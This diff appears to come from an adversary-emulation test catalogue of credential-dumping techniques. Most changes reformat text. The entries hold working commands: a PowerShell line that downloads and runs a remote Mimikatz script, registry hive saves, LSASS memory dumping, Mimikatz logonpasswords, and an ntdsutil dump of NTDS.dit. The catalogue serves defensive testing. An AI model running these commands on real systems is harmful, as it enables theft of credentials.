@@ -11852,7 +11852,7 @@ credential-access:
         remote_script:
           description: URL to a remote Mimikatz script that dumps credentials
           type: Url
-          default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+          default: https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1
       executor:
         name: powershell
         command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
@@ -11899,9 +11899,9 @@ credential-access:
           reg save HKLM\system system
           reg save HKLM\security security
     - name: Dump LSASS.exe Memory using ProcDump
-      description: "The memory of lsass.exe is often dumped for offline credential
-        theft attacks. This can be achieved with Sysinternals \nProcDump. The tool
-        may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.\n"
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+        ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
       supported_platforms:
       - windows
       input_arguments:
@@ -11915,25 +11915,28 @@ credential-access:
 
 '
     - name: Dump LSASS.exe Memory using Windows Task Manager
-      description: "The memory of lsass.exe is often dumped for offline credential
-        theft attacks. This can be achieved with the Windows Task \nManager and administrative
-        permissions.\n"
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
+        Manager and administrative permissions.
       supported_platforms:
       - windows
       executor:
         name: manual
-        steps: "1. Open Task Manager:\n  On a Windows system this can be accomplished
-          by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
-          \n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n
-          \ If lsass.exe is not visible, select \"Show processes from all users\".
-          This will allow you to observe execution of lsass.exe \n  and select it
-          for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe
-          in Task Manager. Select \"Create Dump File\". The following dialog will
-          show you the path to the saved file.\n"
+        steps: |
+          1. Open Task Manager:
+            On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
+            on the task bar and selecting "Task Manager".
+
+          2. Select lsass.exe:
+            If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
+            and select it for manipulation.
+
+          3. Dump lsass.exe memory:
+            Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
     - name: Offline Credential Theft With Mimikatz
-      description: "The memory of lsass.exe is often dumped for offline credential
-        theft attacks. Adversaries commonly perform this offline analysis with \nMimikatz.
-        This tool is available at https://github.com/gentilkiwi/mimikatz.\n"
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
+        Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.
       supported_platforms:
       - windows
       input_arguments:
@@ -11953,11 +11956,10 @@ credential-access:
           3. Obtain Credentials:
             Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
     - name: Dump Active Directory Database with NTDSUtil
-      description: "The Active Directory database NTDS.dit may be dumped using NTDSUtil
-        for offline credential theft attacks. This capability \nuses the \"IFM\" or
-        \"Install From Media\" backup functionality that allows Active Directory restoration
-        or installation of \nsubsequent domain controllers without the need of network-based
-        replication.\n"
+      description: |
+        The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
+        uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
+        subsequent domain controllers without the need of network-based replication.
       supported_platforms:
       - windows
       input_arguments:
@@ -11967,7 +11969,9 @@ credential-access:
           default: C:\Atomic_Red_Team
       executor:
         name: command_prompt
-        command: 'ntdsutil “ac i ntds” “ifm” “create full #{output_folder} q q'
+        command: 'ntdsutil “ac i ntds” “ifm” “create full #{output_folder} q q
+
+'
   T1081:
     technique:
       name: Credentials in Files
